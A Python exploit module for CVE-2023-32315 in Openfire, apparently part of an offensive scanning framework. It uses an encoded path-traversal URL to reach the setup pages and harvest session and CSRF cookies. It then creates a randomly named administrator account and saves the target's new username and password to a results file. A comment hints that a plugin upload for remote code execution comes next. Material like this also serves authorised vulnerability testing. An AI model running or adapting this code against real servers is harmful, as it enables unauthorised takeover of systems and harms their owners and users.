#!/user/bin/env python3
# -*- coding: utf-8 -*-
# Author: Pari Malam

import random
import string
import HackRequests
# from colorama import Fore, init
from libs.public.outprint import OutPrintInfo


class Cve_2023_32315:
    def generate_random_string(self,length):
        charset = string.ascii_lowercase + string.digits
        return ''.join(random.choice(charset) for _ in range(length))


    def between(self,string, starting, ending):
        try:
            s = string.find(starting)
            if s < 0:
                return ""
            s += len(starting)
            e = string[s:].find(ending)
            if e < 0:
                return ""
            return string[s: s + e]
        except Exception:
            return ""



    def exploit(self,target):
        hack = HackRequests.hackRequests()
        host = target.split("://")[1]

        jsessionid = ""
        csrf = ""

        try:
            url = f"{target}/setup/setup-s/%u002e%u002e/%u002e%u002e/user-groups.jsp"
            # log_url = f"{target}/setup/setup-s/%u002e%u002e/%u002e%u002e/log.jsp"
            # plugin_url = f"{target}/setup/setup-/../../plugin-admin.jsp?update=true&restart=true"

            headers = {
                "User-Agent": self.header,
                "Accept-Encoding": "gzip, deflate",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Connection": "close",
                "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
                "DNT": "1",
                "X-Forwarded-For": "1.3.3.7",
                "Upgrade-Insecure-Requests": "1"
            }

            # print(f"{self.FY}[CVE-2023–32315] - {self.FW}{target} - {self.FG}Checking in current... Please be patient!")

            r = hack.http(url, headers=headers)
            jsessionid = r.cookies.get('JSESSIONID', '')
            csrf = r.cookies.get('csrf', '')

            if jsessionid != "" and csrf != "":
                pass
                # print(
                #     f"{self.FY}[CVE-2023–32315] - {self.FW}{target} - {self.FG}[w00t!] {self.FY}JSESSIONID: {self.FW}{jsessionid} {self.FY}CSRF: {self.FW}{csrf}")
            else:
                # print(f"{self.FY}[CVE-2023–32315] - {self.FW}{target} - {self.FR}[Failed] Cannot obatained jsessionid and csrf")
                return

            u = self.generate_random_string(6)
            p = self.generate_random_string(6)

            headerss = {
                "Host": host,
                "User-Agent": self.header,
                "Accept-Encoding": "gzip, deflate",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Connection": "close",
                "Cookie": f"JSESSIONID={jsessionid}; csrf={csrf}",
                "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
                "DNT": "1",
                "X-Forwarded-For": "1.3.3.7",
                "Upgrade-Insecure-Requests": "1"
            }

            create_user = f"{target}/setup/setup-s/%u002e%u002e/%u002e%u002e/user-create.jsp?csrf={csrf}&username={u}&name=&email=&password={p}&passwordConfirm={p}&isadmin=on&create=%E5%88%9B%E5%BB%BA%E7%94%A8%E6%88%B7"
            r = hack.http(create_user, headers=headerss,proxy=self.proxy)

            if r.status_code == 200:
                # print(
                    # f"{self.FY}[CVE-2023–32315] - {self.FW}{target} - {self.FG}[w00t!] Successful with no problemo!\n{self.FY}[+] URLs: {target}\nUsername: {u}\nPassword: {p}")
                # print(f"{self.FY}后续可以通过上传Jar包进行RCE利用")
                OutPrintInfo("Openfire",f"{target} User:{u} Pass:{p}")
                with open("./result/openfireAuthor.txt", "a") as f:
                    f.write(f"{target} User:{u} Pass:{p}\n")
                #     if not os.path.exists('Results'):
                #         os.mkdir('Results')
                #         f.write(
                #             f".++==========[Pari Malam]==========++.\n[+] URLs: {target}\nUsername: {u}\nPassword: {p}\n\n")
            else:
                pass
                # print(f"{self.FY}[CVE-2023–32315] - {self.FW}{target} - {self.FR}[Failed!]")

        except Exception as e:
            pass
            # print(f"{self.FY}[CVE-2023–32315] - {self.FW}{target} - {self.FR}[Failed!] - Error occurred while retrieving cookies")


    def main(self,target):
        url = target[0].strip('/ ')
        self.header = target[1]
        proxy = target[2]


        self.proxy = {"http":proxy,"https":proxy}

        self.exploit(url)
